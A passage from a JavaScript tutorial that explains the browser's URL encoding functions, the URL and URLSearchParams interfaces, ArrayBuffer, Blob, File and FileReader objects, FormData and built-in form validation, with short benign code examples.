For example, on a UTF-8 operating system, in the URL `http://www.example.com/q=春节`, the Chinese characters "春节" (Spring Festival) are not legal URL characters, so they are automatically converted by the browser into `http://www.example.com/q=%E6%98%A5%E8%8A%82`. Of these, "春" is converted to `%E6%98%A5` and "节" is converted to `%E8%8A%82`. This is because the UTF-8 encodings of "春" and "节" are `E6 98 A5` and `E8 8A 82` respectively, and prefixing each byte with a percent sign constitutes the URL encoding.

JavaScript provides four URL encoding/decoding methods.

- `encodeURI()`
- `encodeURIComponent()`
- `decodeURI()`
- `decodeURIComponent()`



#### 2.1 encodeURI()

The `encodeURI()` method is used to encode an entire URL. Its argument is a string representing the entire URL. It escapes all characters except metacharacters and semantic characters.

```js
encodeURI('http://www.example.com/q=春节')
// "http://www.example.com/q=%E6%98%A5%E8%8A%82"
```



#### 2.2 encodeURIComponent()

The `encodeURIComponent()` method is used to encode a component of a URL; it encodes all characters except semantic characters, that is, metacharacters are also encoded. Therefore, it cannot be used to encode an entire URL. It accepts one argument, a fragment of the URL.

```js
encodeURIComponent('春节')
// "%E6%98%A5%E8%8A%82"
encodeURIComponent('http://www.example.com/q=春节')
// "http%3A%2F%2Fwww.example.com%2Fq%3D%E6%98%A5%E8%8A%82"
```

In the code above, `encodeURIComponent()` escapes even the URL metacharacters, so encoding an entire URL with it would produce errors.



#### 2.3 decodeURI()

The `decodeURI()` method is used to decode an entire URL. It is the inverse operation of the `encodeURI()` method. It accepts one argument, the encoded URL.

```js
decodeURI('http://www.example.com/q=%E6%98%A5%E8%8A%82')
// "http://www.example.com/q=春节"
```



#### 2.4 decodeURIComponent()

`decodeURIComponent()` is used to decode a URL fragment. It is the inverse operation of the `encodeURIComponent()` method. It accepts one argument, the encoded URL fragment.

```js
decodeURIComponent('%E6%98%A5%E8%8A%82')
// "春节"
```



### 3. The URL interface

The `URL` interface is a constructor provided natively by the browser that can be used to construct, parse, and encode URLs. In general, you can obtain this constructor via `window.URL`.



#### 3.1 The constructor

As a constructor, `URL` can generate URL instances. It accepts a string representing a URL as an argument. If the argument is not a valid URL, an error is thrown.

```js
var url = new URL('http://www.example.com/index.html');
url.href
// "http://www.example.com/index.html"
```

If the argument is another URL instance, the constructor automatically reads that instance's `href` property as the actual argument.

If the URL string is a relative path, then a second argument representing an absolute path is needed as the calculation base.

```js
var url1 = new URL('index.html', 'http://example.com');
url1.href
// "http://example.com/index.html"

var url2 = new URL('page2.html', 'http://example.com/page1.html');
url2.href
// "http://example.com/page2.html"

var url3 = new URL('..', 'http://example.com/a/b.html')
url3.href
// "http://example.com/"
```

In the code above, the paths of the returned URL instances are all obtained by switching to the first argument on the basis of the second argument. In the last example, the first argument is `..`, representing the parent path.



#### 3.2 Instance properties

The properties of a URL instance are basically the same as those of the `Location` object, returning information about the current URL.

- URL.href: returns the entire URL
- URL.protocol: returns the protocol, ending with a colon `:`
- URL.hostname: returns the domain
- URL.host: returns the domain and port, including the `:` sign; the default ports 80 and 443 are omitted
- URL.port: returns the port
- URL.origin: returns the protocol, domain, and port
- URL.pathname: returns the path, starting with a slash `/`
- URL.search: returns the query string, starting with a question mark `?`
- URL.searchParams: returns a `URLSearchParams` instance; this property is not present on the `Location` object
- URL.hash: returns the fragment identifier, starting with a hash `#`
- URL.password: returns the password before the domain
- URL.username: returns the username before the domain

```js
var url = new URL('http://user:passwd@www.example.com:4097/path/a.html?x=111#part1');

url.href
// "http://user:passwd@www.example.com:4097/path/a.html?x=111#part1"
url.protocol
// "http:"
url.hostname
// "www.example.com"
url.host
// "www.example.com:4097"
url.port
// "4097"
url.origin
// "http://www.example.com:4097"
url.pathname
// "/path/a.html"
url.search
// "?x=111"
url.searchParams
// URLSearchParams {}
url.hash
// "#part1"
url.password
// "passwd"
url.username
// "user"
```

Among these properties, only the `origin` property is read-only; all other properties are writable.

```js
var url = new URL('http://example.com/index.html#part1');

url.pathname = 'index2.html';
url.href // "http://example.com/index2.html#part1"

url.hash = '#part2';
url.href // "http://example.com/index2.html#part2"
```

In the code above, changes to the `pathname` property and `hash` property of the URL instance are reflected in the URL instance in real time.



#### 3.3 Static methods

**(1) URL.createObjectURL()**

The `URL.createObjectURL()` method is used to generate a URL string for an uploaded/downloaded file or a streaming media file. This string represents the URL of a `File` object or `Blob` object.

```js
// HTML code as follows
// <div id="display"/>
// <input
//   type="file"
//   id="fileElem"
//   multiple
//   accept="image/*"
//   onchange="handleFiles(this.files)"
//  >
var div = document.getElementById('display');

function handleFiles(files) {
  for (var i = 0; i < files.length; i++) {
    var img = document.createElement('img');
    img.src = window.URL.createObjectURL(files[i]);
    div.appendChild(img);
  }
}
```

In the code above, the `URL.createObjectURL()` method is used to generate a URL string for the uploaded file, serving as the image source of an `<img>` element.

The URL generated by this method looks like the following.

```js
blob:http://localhost/c745ef73-ece9-46da-8f66-ebes574789b1
```

Note that each use of the `URL.createObjectURL()` method generates a URL instance in memory. If the URL string generated by this method is no longer needed, to save memory you can use the `URL.revokeObjectURL()` method to release this instance.

**(2) URL.revokeObjectURL()**

The `URL.revokeObjectURL()` method is used to release the URL instance generated by the `URL.createObjectURL()` method. Its argument is the URL string returned by the `URL.createObjectURL()` method.

Below, `URL.revokeObjectURL()` is added to the example from the previous section.

```js
var div = document.getElementById('display');

function handleFiles(files) {
  for (var i = 0; i < files.length; i++) {
    var img = document.createElement('img');
    img.src = window.URL.createObjectURL(files[i]);
    div.appendChild(img);
    img.onload = function() {
      window.URL.revokeObjectURL(this.src);
    }
  }
}
```

In the code above, once the image has loaded successfully, the URL string generated for the local file is no longer useful, so you can release this URL instance via the `URL.revokeObjectURL()` method inside the `img.onload` callback function.



### 4. The URLSearchParams object

#### 4.1 Overview

The `URLSearchParams` object is a native browser object used to construct, parse, and handle the query string of a URL (that is, the part after the question mark in the URL).

It is itself also a constructor that can generate instances. The argument can be a query string, with or without the leading question mark `?`, and can also be an array or object corresponding to a query string.

```js
// method 1: pass in a string
var params = new URLSearchParams('?foo=1&bar=2');
// equivalent to
var params = new URLSearchParams(document.location.search);

// method 2: pass in an array
var params = new URLSearchParams([['foo', 1], ['bar', 2]]);

// method 3: pass in an object
var params = new URLSearchParams({'foo' : 1 , 'bar' : 2});
```

`URLSearchParams` automatically encodes the query string.

```js
var params = new URLSearchParams({'foo': '你好'});
params.toString() // "foo=%E4%BD%A0%E5%A5%BD"
```

In the code above, the value of `foo` is a Chinese string, and `URLSearchParams` automatically URL-encodes it.

When the browser sends form data to the server, it can directly use a `URLSearchParams` instance as the form data.

```js
const params = new URLSearchParams({foo: 1, bar: 2});
fetch('https://example.com/api', {
  method: 'POST',
  body: params
}).then(...)
```

In the code above, when the `fetch` command sends a request to the server, it can directly use a `URLSearchParams` instance.

`URLSearchParams` can be used in combination with the `URL` interface.

```js
var url = new URL(window.location);
var foo = url.searchParams.get('foo') || 'somedefault';
```

In the code above, the URL instance's `searchParams` property is a `URLSearchParams` instance, so you can use the `get` method of the `URLSearchParams` interface.

A `URLSearchParams` instance has an iterator interface and can be iterated over with a `for...of` loop (see the chapter "Iterator" in "Getting Started with the ES6 Standard" for details).

```js
var params = new URLSearchParams({'foo': 1 , 'bar': 2});

for (var p of params) {
  console.log(p[0] + ': ' + p[1]);
}
// foo: 1
// bar: 2
```

`URLSearchParams` has no instance properties, only instance methods.



#### 4.2 URLSearchParams.toString()

The `toString` method returns the string form of the instance.

```js
var url = new URL('https://example.com?foo=1&bar=2');
var params = new URLSearchParams(url.search);

params.toString() // "foo=1&bar=2'
```

In situations where a string is needed, the `toString` method is called automatically.

```js
var params = new URLSearchParams({version: 2.0});
window.location.href = location.pathname + '?' + params;
```

In the code above, when assigning to `location.href`, the `params` object can be used directly. The `toString` method is then called automatically.



#### 4.3 URLSearchParams.append()

The `append()` method is used to append a query parameter. It accepts two arguments, the first being the key name and the second being the value, and has no return value.

```js
var params = new URLSearchParams({'foo': 1 , 'bar': 2});
params.append('baz', 3);
params.toString() // "foo=1&bar=2&baz=3"
```

The `append()` method does not check whether the key name already exists.

```js
var params = new URLSearchParams({'foo': 1 , 'bar': 2});
params.append('foo', 3);
params.toString() // "foo=1&bar=2&foo=3"
```

In the code above, `foo` already exists in the query string, but `append` still appends a key with the same name.



#### 4.4 URLSearchParams.delete()

The `delete()` method is used to delete a specified query parameter. It accepts the key name as an argument.

```js
var params = new URLSearchParams({'foo': 1 , 'bar': 2});
params.delete('bar');
params.toString() // "foo=1"
```



#### 4.5 URLSearchParams.has()

The `has()` method returns a boolean value indicating whether the query string contains the specified key name.

```js
var params = new URLSearchParams({'foo': 1 , 'bar': 2});
params.has('bar') // true
params.has('baz') // false
```



#### 4.6 URLSearchParams.set()

The `set()` method is used to set the value of a query string key.

It accepts two arguments, the first being the key name and the second being the value. If the key already exists, the value is overwritten; otherwise it is appended.

```js
var params = new URLSearchParams('?foo=1');
params.set('foo', 2);
params.toString() // "foo=2"
params.set('bar', 3);
params.toString() // "foo=2&bar=3"
```

In the code above, `foo` is a key that already exists, and `bar` is a key that does not yet exist.

If there are multiple keys with the same name, `set` removes all existing keys.

```js
var params = new URLSearchParams('?foo=1&foo=2');
params.set('foo', 3);
params.toString() // "foo=3"
```

Below is an example of replacing the current URL.

```js
// URL: https://example.com?version=1.0
var params = new URLSearchParams(location.search.slice(1));
params.set('version', 2.0);

window.history.replaceState({}, '', location.pathname + `?` + params);
// URL: https://example.com?version=2.0
```



#### 4.7 URLSearchParams.get(), URLSearchParams.getAll()

The `get()` method is used to read a specified key in the query string. It accepts the key name as an argument.

```js
var params = new URLSearchParams('?foo=1');
params.get('foo') // "1"
params.get('bar') // null
```

There are two things to note. First, it returns a string, so if the original value is a number, you need to convert the type; second, if the specified key name does not exist, the return value is `null`.

If there are multiple keys with the same name, `get` returns the value of the one in the frontmost position.

```js
var params = new URLSearchParams('?foo=3&foo=2&foo=1');
params.get('foo') // "3"
```

In the code above, the query string has three `foo` keys, and the `get` method returns the frontmost value `3`.

The `getAll()` method returns an array whose members are all the values of the specified key. It accepts the key name as an argument.

```js
var params = new URLSearchParams('?foo=1&foo=2');
params.getAll('foo') // ["1", "2"]
```

In the code above, the query string has two `foo` keys, so the array returned by `getAll` has two members.



#### 4.8 URLSearchParams.sort()

The `sort()` method sorts the keys in the query string, with the rule being to arrange them by Unicode code point from smallest to largest.

This method has no return value, or rather its return value is `undefined`.

```js
var params = new URLSearchParams('c=4&a=2&b=3&a=1');
params.sort();
params.toString() // "a=2&a=1&b=3&c=4"
```

In the code above, if there are two keys named `a`, they are not sorted relative to each other but retain their original order.



#### 4.9 URLSearchParams.keys(), URLSearchParams.values(), URLSearchParams.entries()

All three of these methods return an iterator object for `for...of` loop iteration. The difference between them is that the `keys` method returns an iterator of key names, the `values` method returns an iterator of values, and `entries` returns an iterator of key-value pairs.

```js
var params = new URLSearchParams('a=1&b=2');

for(var p of params.keys()) {
  console.log(p);
}
// a
// b

for(var p of params.values()) {
  console.log(p);
}
// 1
// 2

for(var p of params.entries()) {
  console.log(p);
}
// ["a", "1"]
// ["b", "2"]
```

If you iterate directly over `URLSearchParams`, internally it actually calls the `entries` interface.

```js
for (var p of params) {}
// equivalent to
for (var p of params.entries()) {}
```



## 11. ArrayBuffer Object and Blob Object

### 1. The ArrayBuffer object

The ArrayBuffer object represents a segment of binary data, used to simulate data in memory. Through this object, JavaScript can read and write binary data. This object can be regarded as a representation of in-memory data.

This object was only written into the standard in ES6; ordinary web programming does not use it. For the completeness of the tutorial system, only a brief introduction is provided below; for a detailed introduction, see the relevant chapters in "Getting Started with the ES6 Standard".

The browser natively provides the `ArrayBuffer()` constructor for generating instances. It accepts an integer as an argument, indicating how many bytes this segment of binary data occupies.

```js
var buffer = new ArrayBuffer(8);
```

In the code above, the instance object `buffer` occupies 8 bytes.

The ArrayBuffer object has an instance property `byteLength`, indicating the memory length occupied by the current instance (in bytes).

```js
var buffer = new ArrayBuffer(8);
buffer.byteLength // 8
```

The ArrayBuffer object has an instance method `slice()`, used to copy a portion of memory. It accepts two integer arguments representing the start position of the copy (starting from 0) and the end position (the end position is not included in the copy); if the second argument is omitted, it means copying all the way to the end.

```js
var buf1 = new ArrayBuffer(8);
var buf2 = buf1.slice(0);
```

The code above copies the original instance.



### 2. The Blob object

#### 2.1 Introduction

The Blob object represents the data content of a binary file; for example, the content of an image file can be read and written through a Blob object. It is usually used to read and write files, and its name is an abbreviation of Binary Large Object. The difference from ArrayBuffer is that it is used to operate on binary files, whereas ArrayBuffer is used to operate on memory.

The browser natively provides the `Blob()` constructor for generating instance objects.

```js
new Blob(array [, options])
```

The `Blob` constructor accepts two arguments. The first argument is an array whose members are strings or binary objects, representing the content of the newly generated `Blob` instance object; the second argument is optional and is a configuration object that currently has only one property, `type`, whose value is a string representing the MIME type of the data, defaulting to an empty string.

```js
var htmlFragment = ['<a id="a"><b id="b">hey!</b></a>'];
var myBlob = new Blob(htmlFragment, {type : 'text/html'});
```

In the code above, the instance object `myBlob` contains a string. When the instance is generated, the data type is specified as `text/html`.

Below is another example, where Blob stores JSON data.

```js
var obj = { hello: 'world' };
var blob = new Blob([ JSON.stringify(obj) ], {type : 'application/json'});
```



#### 2.2 Instance properties and instance methods

`Blob` has two instance properties, `size` and `type`, which return the size and type of the data respectively.

```js
var htmlFragment = ['<a id="a"><b id="b">hey!</b></a>'];
var myBlob = new Blob(htmlFragment, {type : 'text/html'});

myBlob.size // 32
myBlob.type // "text/html"
```

`Blob` has an instance method `slice`, used to copy the original data; what it returns is also a `Blob` instance.

```js
myBlob.slice(start, end, contentType)
```

The `slice` method has three arguments, all optional. They are, in order, the starting byte position (defaulting to 0), the ending byte position (defaulting to the value of the `size` property; this position itself will not be included in the copied data), and the data type of the new instance (defaulting to an empty string).



#### 2.3 Obtaining file information

The file picker ` <input type="file"> ` is used to let the user select files. For security reasons, the browser does not allow scripts to set the `value` property of this control themselves, that is, the file must be manually selected by the user and cannot be specified by a script. Once the user has selected a file, the script can read this file.

The file picker returns a FileList object, which is an array-like collection of members, each of which is a File instance object. A File instance object is a special Blob instance with the added properties `name` and `lastModifiedDate`.

```js
// HTML code as follows
// <input type="file" accept="image/*" multiple onchange="fileinfo(this.files)"/>

function fileinfo(files) {
  for (var i = 0; i < files.length; i++) {
    var f = files[i];
    console.log(
      f.name, // file name, without path
      f.size, // file size, a Blob instance property
      f.type, // file type, a Blob instance property
      f.lastModifiedDate // the last modified time of the file
    );
  }
}
```

Besides the file picker, the drag-and-drop API's `dataTransfer.files` also returns a FileList object, whose members are therefore also File instance objects.



#### 2.4 Downloading files

During an AJAX request, if the `responseType` property is specified as `blob`, what is downloaded is a Blob object.

```js
function getBlob(url, callback) {
  var xhr = new XMLHttpRequest();
  xhr.open('GET', url);
  xhr.responseType = 'blob';
  xhr.onload = function () {
    callback(xhr.response);
  }
  xhr.send(null);
}
```

In the code above, what `xhr.response` obtains is a Blob object.



#### 2.5 Generating a URL

The browser allows using the `URL.createObjectURL()` method to generate a temporary URL for a Blob object, for use by certain APIs. This URL starts with `blob://`, indicating that it corresponds to a Blob object; after the protocol header is an identifier used to uniquely correspond to the Blob object in memory. This is different from both `data://URL` (where the URL contains the actual data) and `file://URL` (a file in the local file system).

```js
var droptarget = document.getElementById('droptarget');

droptarget.ondrop = function (e) {
  var files = e.dataTransfer.files;
  for (var i = 0; i < files.length; i++) {
    var type = files[i].type;
    if (type.substring(0,6) !== 'image/')
      continue;
    var img = document.createElement('img');
    img.src = URL.createObjectURL(files[i]);
    img.onload = function () {
      this.width = 100;
      document.body.appendChild(this);
      URL.revokeObjectURL(this.src);
    }
  }
}
```

The code above generates a URL for the dragged-and-dropped image files to produce their thumbnails, thereby allowing the user to preview the selected files.

The browser handles a Blob URL just like an ordinary URL: if the Blob object does not exist, it returns a 404 status code; if it is a cross-origin request, it returns a 403 status code. A Blob URL is only valid for GET requests; if the request succeeds, it returns a 200 status code. Since a Blob URL is an ordinary URL, it can be downloaded.



#### 2.6 Reading files

After obtaining a Blob object, you can read the content of the Blob object, that is, the file content, via the `FileReader` object.

The FileReader object provides four methods for handling Blob objects. A Blob object is passed in as an argument to these methods and is then returned in the specified format.

- `FileReader.readAsText()`: returns text; you need to specify the text encoding, defaulting to UTF-8.
- `FileReader.readAsArrayBuffer()`: returns an ArrayBuffer object.
- `FileReader.readAsDataURL()`: returns a Data URL.
- `FileReader.readAsBinaryString()`: returns the raw binary string.

Below is an example of the `FileReader.readAsText()` method, used to read a text file.

```js
// HTML code as follows
// <input type=’file' onchange='readfile(this.files[0])'></input>
// <pre id='output'></pre>
function readfile(f) {
  var reader = new FileReader();
  reader.readAsText(f);
  reader.onload = function () {
    var text = reader.result;
    var out = document.getElementById('output');
    out.innerHTML = '';
    out.appendChild(document.createTextNode(text));
  }
  reader.onerror = function(e) {
    console.log('Error', e);
  };
}
```

In the code above, by specifying the `onload` listener function of the FileReader instance object, the file content is obtained from the instance's `result` property.

Below is an example of the `FileReader.readAsArrayBuffer()` method, used to read a binary file.

```js
// HTML code as follows
// <input type="file" onchange="typefile(this.files[0])"></input>
function typefile(file) {
  // the first four bytes of the file, generating a Blob object
  var slice = file.slice(0, 4);
  var reader = new FileReader();
  // read these four bytes
  reader.readAsArrayBuffer(slice);
  reader.onload = function (e) {
    var buffer = reader.result;
    // treat the content of these four bytes as a 32-bit integer
    var view = new DataView(buffer);
    var magic = view.getUint32(0, false);
    // determine the file's type based on its first four bytes
    switch(magic) {
      case 0x89504E47: file.verified_type = 'image/png'; break;
      case 0x47494638: file.verified_type = 'image/gif'; break;
      case 0x25504446: file.verified_type = 'application/pdf'; break;
      case 0x504b0304: file.verified_type = 'application/zip'; break;
    }
    console.log(file.name, file.verified_type);
  };
}
```



## 12. File Object, FileList Object, and FileReader Object

### 1. The File object

The File object represents a file, used to read and write file information. It inherits from the Blob object, or is a special kind of Blob object, and can be used in all situations where a Blob object can be used.

The most common use case is the file upload control of a form (``); after the user selects files, the browser generates an array containing each file the user selected, all of which are File instance objects.

```js
// HTML code as follows
// <input id="fileItem" type="file">
var file = document.getElementById('fileItem').files[0];
file instanceof File // true
```

In the code above, `file` is the first file the user selected, and it is an instance of File.

#### 1.1 The constructor

The browser natively provides a `File()` constructor for generating File instance objects.

```js
new File(array, name [, options])
```

The `File()` constructor accepts three arguments.

- array: an array whose members can be binary objects or strings, representing the content of the file.
- name: a string representing the file name or file path.
- options: a configuration object that sets the instance's properties. This argument is optional.

The third argument, the configuration object, can set two properties.

- type: a string representing the MIME type of the instance object, defaulting to an empty string.
- lastModified: a timestamp representing the last modified time, defaulting to `Date.now()`.

Below is an example.

```js
var file = new File(
  ['foo'],
  'foo.txt',
  {
    type: 'text/plain',
  }
);
```



#### 1.2 Instance properties and instance methods

The File object has the following instance properties.

- File.lastModified: the last modified time
- File.name: the file name or file path
- File.size: the file size (in bytes)
- File.type: the MIME type of the file

```js
var myFile = new File([], 'file.bin', {
  lastModified: new Date(2018, 1, 1),
});
myFile.lastModified // 1517414400000
myFile.name // "file.bin"
myFile.size // 0
myFile.type // ""
```

In the code above, since `myFile`'s content is empty and no MIME type is set, the `size` property equals 0 and the `type` property equals an empty string.

The File object has no instance methods of its own; since it inherits from the Blob object, it can use Blob's instance method `slice()`.



### 2. The FileList object

The `FileList` object is an array-like object representing a set of selected files, each of whose members is a File instance. It mainly appears in two situations.

- The `files` property of a file control node (``) returns a FileList instance.
- When dragging a set of files, the `DataTransfer.files` property of the target area returns a FileList instance.

```js
// HTML code as follows
// <input id="fileItem" type="file">
var files = document.getElementById('fileItem').files;
files instanceof FileList // true
```

In the code above, the file control's `files` property is a FileList instance.

The main instance property of FileList is `length`, indicating how many files it contains.

The main instance method of FileList is `item()`, used to return the instance at a specified position. It accepts an integer as an argument representing the position index (starting from zero). However, since a FileList instance is an array-like object, you can directly use the bracket operator, that is, `myFileList[0]` is equivalent to `myFileList.item(0)`, so the `item()` method is generally not needed.



### 3. The FileReader object

The FileReader object is used to read the file content contained in a File object or Blob object.

The browser natively provides a `FileReader` constructor for generating FileReader instances.

```js
var reader = new FileReader();
```

FileReader has the following instance properties.

- FileReader.error: the error object produced while reading the file
- FileReader.readyState: an integer representing the current state while reading the file. There are three possible states: `0` means no data has been loaded yet, `1` means data is being loaded, and `2` means loading is complete.
- FileReader.result: the file content after reading is complete, which may be a string or an ArrayBuffer instance.
- FileReader.onabort: the listener function for the `abort` event (the user terminates the read operation).
- FileReader.onerror: the listener function for the `error` event (a read error).
- FileReader.onload: the listener function for the `load` event (the read operation completes); usually you use the `result` property inside this function to obtain the file content.
- FileReader.onloadstart: the listener function for the `loadstart` event (the read operation starts).
- FileReader.onloadend: the listener function for the `loadend` event (the read operation ends).
- FileReader.onprogress: the listener function for the `progress` event (the read operation is in progress).

Below is an example of listening for the `load` event.

```js
// HTML code as follows
// <input type="file" onchange="onChange(event)">

function onChange(event) {
  var file = event.target.files[0];
  var reader = new FileReader();
  reader.onload = function (event) {
    console.log(event.target.result)
  };

  reader.readAsText(file);
}
```

In the code above, whenever the file control changes, it attempts to read the first file. If the read succeeds (the `load` event occurs), it prints out the file content.

FileReader has the following instance methods.

- FileReader.abort(): terminates the read operation; the `readyState` property becomes `2`.
- FileReader.readAsArrayBuffer(): reads the file in ArrayBuffer format; after reading is complete, the `result` property returns an ArrayBuffer instance.
- FileReader.readAsBinaryString(): after reading is complete, the `result` property returns the raw binary string.
- FileReader.readAsDataURL(): after reading is complete, the `result` property returns a Data URL format (Base64-encoded) string representing the file content. For image files, this string can be used in the `src` attribute of an `  <img>  ` element. Note that this string cannot be directly Base64-decoded; you must first remove the prefix `data:*/*;base64,` from the string before decoding.
- FileReader.readAsText(): after reading is complete, the `result` property returns the text string of the file content. The first argument of this method is the Blob instance representing the file, and the second argument is optional, representing the text encoding, defaulting to UTF-8.

Below is an example.

```js
/* HTML code as follows
  <input type="file" onchange="previewFile()">
  <img src="" height="200">
*/

function previewFile() {
  var preview = document.querySelector('img');
  var file    = document.querySelector('input[type=file]').files[0];
  var reader  = new FileReader();

  reader.addEventListener('load', function () {
    preview.src = reader.result;
  }, false);

  if (file) {
    reader.readAsDataURL(file);
  }
}
```

In the code above, after the user selects an image file, the script automatically reads the file content and then assigns it as a Data URL to the `src` attribute of the `  <img>  ` element, thereby displaying the image.



## 13. Forms and the FormData Object

### 1. Form overview

A form (` <form> `) is used to collect data submitted by the user and send it to the server. For example, when the user submits a username and password for the server to verify, a form is used. Forms provide various controls for developers to use; for the specific control types and usage, please refer to the HTML language tutorial. This chapter mainly introduces the interaction between JavaScript and forms.

```html
<form action="/handling-page" method="post">
  <div>
    <label for="name">Username:</label>
    <input type="text" id="name" name="user_name" />
  </div>
  <div>
    <label for="passwd">Password:</label>
    <input type="password" id="passwd" name="user_passwd" />
  </div>
  <div>
    <input type="submit" id="submit" name="submit_button" value="Submit" />
  </div>
</form>
```

The code above is a simple form containing three controls: a username input box, a password input box, and a submit button.

When the user clicks the "Submit" button, each control generates a key-value pair, where the key name is the control's `name` attribute and the value is the control's `value` attribute, with the key name and value connected by an equals sign. For example, the username input box's `name` attribute is `user_name`, and its `value` attribute is the value the user entered, say "John", so when submitted to the server, a key-value pair `user_name=John` is generated.

All key-value pairs are submitted to the server. However, the format of the submitted data depends on the ` <form> ` element's `method` attribute. This attribute specifies the HTTP method for submitting the data. If it is the GET method, all key-value pairs are submitted to the server in the form of the URL's query string, for example `/handling-page?user_name=John&user_passwd=123&submit_button=Submit`. Below are the HTTP headers of the GET request.

```js
GET /handling-page?user_name=John&user_passwd=123&submit_button=Submit
Host: example.com
```

If it is the POST method, all key-value pairs are joined into one line and sent to the server as the data body of the HTTP request, for example `user_name=John&user_passwd=123&submit_button=Submit`. Below are the headers of the POST request.

```js
POST /handling-page HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 74

user_name=John&user_passwd=123&submit_button=Submit
```

Note that on actual submission, as long as a value is not a legal URL character (such as non-ASCII text), the browser automatically encodes it.

Clicking the `submit` control submits the form.

```html
<form>
  <input type="submit" value="Submit">
</form>
```

The form above contains a `submit` control; clicking this control makes the browser submit the form data to the server.

Note that if an `<input>` element in a form does not specify a type with the `type` attribute, then it defaults to a `submit` control.

```html
<form>
  <button>Submit</button>
</form>
```

The `<button>` element in the form above also submits the form when clicked.

Besides clicking the `submit` control to submit the form, you can also use the form element's `submit()` method to submit the form via a script.

```js
formElement.submit();
```

The form element's `reset()` method can reset the values of all controls (to their default values).

```js
formElement.reset()
```



### 2. The FormData object

#### 2.1 Overview

Form data is sent to the server in the form of key-value pairs, a process that the browser completes automatically. But sometimes we want to complete the process via a script, constructing and editing the form key-value pairs and then sending them via the `XMLHttpRequest.send()` method. The browser natively provides the FormData object to accomplish this.

FormData is first of all a constructor used to generate instances.

```js
var formdata = new FormData(form);
```

The argument of the `FormData()` constructor is a form element, and this argument is optional. If the argument is omitted, it represents an empty form; otherwise it processes the key-value pairs within the form element.

Below is a form.

```html
<form id="myForm" name="myForm">
  <div>
    <label for="username">Username:</label>
    <input type="text" id="username" name="username">
  </div>
  <div>
    <label for="useracc">Account:</label>
    <input type="text" id="useracc" name="useracc">
  </div>
  <div>
    <label for="userfile">Upload file:</label>
    <input type="file" id="userfile" name="userfile">
  </div>
<input type="submit" value="Submit!">
</form>
```

We use a FormData object to process the form above.

```js
var myForm = document.getElementById('myForm');
var formData = new FormData(myForm);

// get the value of a control
formData.get('username') // ""

// set the value of a control
formData.set('username', 'John');

formData.get('username') // "John"
```



#### 2.2 Instance methods

FormData provides the following instance methods.

- `FormData.get(key)`: gets the value corresponding to the specified key name, with the argument being the key name. If there are multiple key-value pairs with the same name, it returns the value of the first key-value pair.
- `FormData.getAll(key)`: returns an array representing all values corresponding to the specified key name. If there are multiple key-value pairs with the same name, the array contains all the values.
- `FormData.set(key, value)`: sets the value of the specified key name, with the argument being the key name. If the key name does not exist, this key-value pair is added; otherwise the value of the specified key name is updated. If the second argument is a file, you can also use a third argument representing the file name.
- `FormData.delete(key)`: deletes a key-value pair, with the argument being the key name.
- `FormData.append(key, value)`: adds a key-value pair. If the key name is duplicated, two key-value pairs with the same key name are generated. If the second argument is a file, you can also use a third argument representing the file name.
- `FormData.has(key)`: returns a boolean value indicating whether there is a key-value pair with that key name.
- `FormData.keys()`: returns an iterator object for iterating over all key names with a `for...of` loop.
- `FormData.values()`: returns an iterator object for iterating over all values with a `for...of` loop.
- `FormData.entries()`: returns an iterator object for iterating over all key-value pairs with a `for...of` loop. If you iterate directly over a FormData instance with a `for...of` loop, this method is called by default.

Below is an example of the `get()`, `getAll()`, `set()`, and `append()` methods.

```js
var formData = new FormData();

formData.set('username', 'John');
formData.append('username', 'Mary');
formData.get('username') // "John"
formData.getAll('username') // ["John", "Mary"]

formData.append('userpic[]', myFileInput.files[0], 'user1.jpg');
formData.append('userpic[]', myFileInput.files[1], 'user2.jpg');
```

Below is an example of the iterator.

```js
var formData = new FormData();
formData.append('key1', 'value1');
formData.append('key2', 'value2');

for (var key of formData.keys()) {
  console.log(key);
}
// "key1"
// "key2"

for (var value of formData.values()) {
  console.log(value);
}
// "value1"
// "value2"

for (var pair of formData.entries()) {
  console.log(pair[0] + ': ' + pair[1]);
}
// key1: value1
// key2: value2

// equivalent to iterating over formData.entries()
for (var pair of formData) {
  console.log(pair[0] + ': ' + pair[1]);
}
// key1: value1
// key2: value2
```



### 3. Built-in form validation

#### 3.1 Automatic validation

When a form is submitted, the browser allows developers to specify some conditions, and it automatically validates whether the value of each form control meets the conditions.

```html
<!-- required -->
<input required>

<!-- must match the regular expression -->
<input pattern="banana|cherry">

<!-- string length must be 6 characters -->
<input minlength="6" maxlength="6">

<!-- the number must be between 1 and 10 -->
<input type="number" min="1" max="10">

<!-- must enter an Email address -->
<input type="email">

<!-- must enter a URL -->
<input type="URL">
```

If a control passes validation, it matches the `:valid` CSS pseudo-class, and the browser continues with the form submission process. If it does not pass validation, the control matches the `:invalid` CSS pseudo-class, and the browser aborts the form submission and displays an error message.

```css
input:invalid {
  border-color: red;
}
input,
input:valid {
  border-color: #ccc;
}
```



#### 3.2 checkValidity()

In addition to the browser automatically validating the form when it is submitted, you can also manually trigger form validation. Both form elements and form controls have a `checkValidity()` method for manually triggering validation.

```js
// trigger validation of the entire form
form.checkValidity()

// trigger validation of a single form control
formControl.checkValidity()
```

The `checkValidity()` method returns a boolean value: `true` means validation passed, and `false` means validation did not pass. Therefore, submitting a form can be encapsulated as the following function.

```js
function submitForm(action) {
  var form = document.getElementById('form');
  form.action = action;
  if (form.checkValidity()) {
    form.submit();
  }
}
```



#### 3.3 The willValidate property

The `willValidate` property of a control element is a boolean value indicating whether the control will be validated on submission.

```js
// HTML code as follows
// <form novalidate>
//   <input id="name" name="name" required />
// </form>

var input = document.querySelector('#name');
input.willValidate // true
```



#### 3.4 The validationMessage property

The `validationMessage` property of a control element returns a string representing the prompt text the browser displays when the control does not meet the validation conditions. In the following two cases, this property returns an empty string.

- The control is not automatically validated on submission
- The control meets the validation conditions

```js
// HTML code as follows
// <form><input type="text" required></form>
document.querySelector('form input').validationMessage
// "Please fill in this field."
```

Below is another example.

```js
var myInput = document.getElementById('myinput');
if (!myInput.checkValidity()) {
  document.getElementById('prompt').innerHTML = myInput.validationMessage;
}
```



#### 3.5 setCustomValidity()

The `setCustomValidity()` method of a control element is used to customize the error message displayed when validation fails. It accepts a string as an argument, and this string is the customized error message. If the argument is an empty string, the previously set error message is cleared.

This method can replace the browser's built-in form validation error message, with the argument being the error message to display.

```html
<form action="somefile.php">
  <input
    type="text"
    name="username"
    placeholder="Username"
    pattern="[a-z]{1,15}"
    id="username"
  >
  <input type="submit">
</form>
```

